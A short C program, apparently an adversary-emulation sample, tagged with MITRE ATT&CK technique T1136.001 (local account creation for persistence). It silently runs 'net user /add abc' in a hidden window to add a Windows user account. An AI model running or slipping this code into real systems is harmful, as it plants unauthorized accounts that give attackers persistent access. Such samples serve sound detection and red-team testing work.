// Link      = https://attack.mitre.org/techniques/T1136/001/
// Technique = Create Account: Local Account
// ID        = T1136.001
// Tactics   = Persistence,

#include <windows.h>


int main() {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };

    if (CreateProcessA(NULL,(LPSTR)"net user /add abc",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

